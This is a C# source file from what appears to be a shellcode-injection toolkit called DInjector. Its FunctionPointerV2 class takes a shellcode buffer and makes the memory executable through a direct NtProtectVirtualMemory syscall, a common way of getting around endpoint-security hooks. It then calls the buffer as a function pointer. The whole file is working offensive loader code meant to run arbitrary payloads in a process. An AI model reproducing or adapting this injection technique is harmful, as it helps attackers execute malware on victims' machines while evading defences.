using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class FunctionPointerV2
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        public static void Execute(byte[] shellcode)
        {
            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    IntPtr baseAddress = (IntPtr)ptr;

                    #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

                    IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
                    IntPtr oldAddress = baseAddress;
                    IntPtr regionSize = (IntPtr)shellcode.Length;
                    uint oldProtect = 0;

                    var ntstatus = Syscalls.NtProtectVirtualMemory(
                        hProcess,
                        ref baseAddress,
                        ref regionSize,
                        DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                        ref oldProtect);

                    if (ntstatus == 0)
                        Console.WriteLine("(FunctionPointerV2) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
                    else
                        Console.WriteLine($"(FunctionPointerV2) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

                    pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(oldAddress, typeof(pFunction));
                    f();

                    #endregion
                }
            }
        }
    }
}
